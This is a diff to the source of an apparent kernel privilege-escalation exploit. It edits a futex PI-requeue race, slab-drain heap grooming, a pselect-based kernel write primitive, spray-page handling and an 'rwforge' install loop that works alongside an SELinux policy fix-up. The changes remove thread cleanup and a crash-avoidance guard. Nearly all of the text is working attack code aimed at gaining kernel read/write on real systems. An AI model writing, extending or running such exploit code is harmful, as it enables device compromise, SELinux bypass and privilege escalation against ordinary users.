@@ -199,14 +199,7 @@ void *owner_thread(void *arg __attribute__((unused))) {
   atomic_store(&owner_started, 1);
   futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   atomic_store(&owner_chain_done, 1);
-  /* The waiter has completed the forged route before handing f_pi_chain to
-   * us.  Keeping this owner alive used to leave both PI futexes owned while
-   * reset_main_route_state() zeroed and reused their words on the next
-   * round, which can panic inside select(). */
-  while (!atomic_load(&route_done)) usleep(1000);
-  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-  return NULL;
+  for (;;) sleep(1);
 }
 
 void *consumer_thread(void *arg __attribute__((unused))) {
@@ -270,8 +263,7 @@ void run_main_route_threads(void) {
   SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
   /* A17: no-punch prime round skips the consumer thread entirely */
-  int have_consumer = g_no_punch != 1;
-  if (have_consumer)
+  if (g_no_punch != 1)
     SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
   while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
     usleep(1000);
@@ -279,15 +271,6 @@ void run_main_route_threads(void) {
   errno = 0;
   futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
   while (!atomic_load(&route_done)) usleep(5000);
-  /* consumer_stop used to remain zero, leaving every old consumer alive.
-   * reset_main_route_state() then reactivated all of them on the next round,
-   * producing multiple sched_setattr races against a single waiter. */
-  atomic_store(&punch_consume_go, 0);
-  atomic_store(&punch_consume_stop, 1);
-  if (have_consumer)
-    SYSCHK(pthread_join(consumer, NULL));
-  SYSCHK(pthread_join(waiter, NULL));
-  SYSCHK(pthread_join(owner, NULL));
 }
 
 static void do_one_write(uintptr_t target, const char *desc, int mode) {
@@ -322,12 +305,8 @@ static __attribute__((always_inline)) void fix_selinux_policy(void) {
 static void slab_drain(void) {
   struct timespec up;
   clock_gettime(CLOCK_BOOTTIME, &up);
-  int waves = env_int_range("GL_SLAB_DRAIN_WAVES",
-                             (up.tv_sec > 60) ? 5 : 2, 1, 16);
-  int batch = env_int_range("GL_SLAB_DRAIN_BATCH",
-                             (up.tv_sec > 60) ? 400 : 200, 8, 400);
-  pr_info("slab drain: waves=%d batch=%d uptime=%lld\n", waves, batch,
-          (long long)up.tv_sec);
+  int waves = (up.tv_sec > 60) ? 5 : 2;
+  int batch = (up.tv_sec > 60) ? 400 : 200;
   for (int wave = 0; wave < waves; wave++) {
     pid_t *drain = calloc(batch, sizeof(pid_t));
     int n = 0;
@@ -907,7 +886,6 @@ int rw_page_ok(void) {
 }
 
 int rw_trigger(uintptr_t parent, uintptr_t target) {
-  static int previous_route_connected;
   pselect_child_node = 1;
   uintptr_t value = parent;
   if (parent == RWF_SELF_PAGE) {
@@ -915,16 +893,7 @@ int rw_trigger(uintptr_t parent, uintptr_t target) {
     pselect_value_page_base = 1;
   }
   set_pselect_write_mode(target, value, 3);
-  /* A connected route can dirty the spray page's struct-page state even
-   * when the subsequent owner scan misses.  A full fork/kill slab drain on
-   * the next round then puts memory pressure on that page and panics CZG1.
-   * Keep the live carrier and retry without the pressure wave; the channel
-   * repair path restores every tracked spray page after installation. */
-  if (previous_route_connected && getenv("GL_DEFER_CLOSE")) {
-    pr_info("rw trigger: skipping slab drain after connected miss\n");
-  } else {
-    slab_drain();
-  }
+  slab_drain();
   uintptr_t base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   if (!base)
     pr_error("rw trigger: page prepare failed\n");
@@ -933,7 +902,6 @@ int rw_trigger(uintptr_t parent, uintptr_t target) {
   atomic_store(&consumer_success, 0);
   run_main_route_threads();
   int ok = atomic_load(&consumer_success) > 0;
-  previous_route_connected = ok;
   clear_pselect_write();
   pselect_value_page_base = 0;
   return ok;
@@ -3653,10 +3621,8 @@ int run_rwforge(void) {
     return 1;
   if (getenv("GL_DEFER_CLOSE"))
     pr_info("rwforge: GL_DEFER_CLOSE=1 — carrier skbs held until exit\n");
-  int outer_max = env_int_range("GL_RWF_OUTERS", 2, 1, 2);
-  pr_info("rwforge: outer attempts=%d\n", outer_max);
   int installed = 0;
-  for (int outer = 1; outer <= outer_max && !installed; outer++) {
+  for (int outer = 1; outer <= 2 && !installed; outer++) {
     if (!getenv("NO_PRIME_ROUND")) {
       pr_info("rwforge: no-punch prime round\n");
       g_no_punch = 1;
@@ -3665,9 +3631,9 @@ int run_rwforge(void) {
     }
     installed = rwf_install();
     if (installed) break;
-    pr_warning("rwforge install failed (outer %d/%d)%s\n", outer, outer_max,
-               outer < outer_max ? " — re-reclaiming" : "");
-    if (outer == outer_max)
+    pr_warning("rwforge install failed (outer %d/2)%s\n", outer,
+               outer == 1 ? " — re-reclaiming" : "");
+    if (outer == 2)
       pr_error("rwforge install failed\n");
     /* re-reclaim and retry once */
     pb = prepare_pipe_buffer_page();
